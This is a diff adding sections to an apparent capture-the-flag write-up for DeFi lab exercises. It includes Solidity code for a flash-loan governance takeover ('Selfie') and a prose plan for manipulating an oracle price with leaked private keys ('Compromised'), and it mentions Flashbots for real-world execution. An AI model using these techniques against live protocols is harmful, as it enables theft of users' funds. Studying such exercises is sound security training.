@@ -119,3 +119,69 @@ receive() payable external {}
 
 - [./test/side-entrance/SideEntranceExploiter.sol](./test/side-entrance/SideEntranceExploiter.sol)
 - [./test/side-entrance/SideEntrance.t.sol](./test/side-entrance/SideEntrance.t.sol)
+
+## The Rewarder
+
+Not solved yet.
+
+## Selfie
+
+This pool offers flash loans of all the balance it has of a specific token. This token is also a governance token that can be used to vote on specific actions to take on arbitrary contracts (all contracts except the governance contract). The governance system is simple, in that anyone with more than half of the total supply of tokens delegated to them can propose actions that will be executable by anyone after 2 days. Additionally, the pool has an emergency-exit transaction, that allows the governance contract to send all tokens to a specific address.
+
+The issue of this system is that anyone can ask for a flash loan, and propose new governance actions with the tokens borrowed. To recover the funds that are at risk (the tokens belonging to the pool contract), we can ask for a loan to send the tokens to the recovery contract, delegate the tokens to itself, and propose a governance action to execute `pool.emergencyExit()` and send all funds to the recovery address.
+
+```solidity
+function onFlashLoan(
+    address _initiator,
+    address _token,
+    uint256 _amount,
+    uint256,
+    bytes calldata
+) external returns (bytes32) {
+    if (_initiator != allowedInitiator) {
+        revert NotAllowedInitiator();
+    }
+    if (msg.sender != pool) {
+        revert NotPool();
+    }
+
+    // When receiving the loan, we have more than half of the supply, so
+    // we can queue actions in the governance contract
+
+    // First, we delegate tokens to this contract, so it can queue actions
+    ERC20Votes votingToken = ERC20Votes(_token);
+    votingToken.delegate(address(this));
+
+    // We can queue an action to "emergencyExit" all tokens to the recovery account
+    governance.queueAction(
+        pool,
+        0,
+        abi.encodeWithSignature("emergencyExit(address)", recovery)
+    );
+
+    // We approve the tokens to be received by the pool again
+    ERC20 token = ERC20(_token);
+    token.approve(pool, _amount);
+
+    return CALLBACK_SUCCESS;
+}
+```
+
+**Code**
+
+- [./test/selfie/SelfieRecovery.sol](./test/selfie/SelfieRecovery.sol)
+- [./test/selfie/Selfie.t.sol](./test/selfie/Selfie.t.sol)
+
+## Compromised
+
+This exercise proposes an NFT market where NFTs can be bought and sold for a price determined by an oracle composed of 3 sources. Contracts seem tight, but we are given additional information obtained from a related webservice.
+
+When decoding the information obtained (Hex to ASCII and base64 decode) we obtain 2 hashes which correspond to the private keys of 2 of the 3 sources used on the oracle.
+
+We can use this to manipulate the price and recover the funds from the NFT market (the Exchange). We first change the price to the minimum accepted (1 wei), buy one NFT, change the price to the full balance of the Exchange, and sell the NFT obtained. We can then transfer the recovered funds to the recovery address, and set the prices back to the original price.
+
+In a real-world scenario, some care should be taken to try to perform all these operations as close as possible, for example, using Flashbots or a similar service.
+
+**Code**
+
+- [./test/compromised/Compromised.t.sol](./test/compromised/Compromised.t.sol)
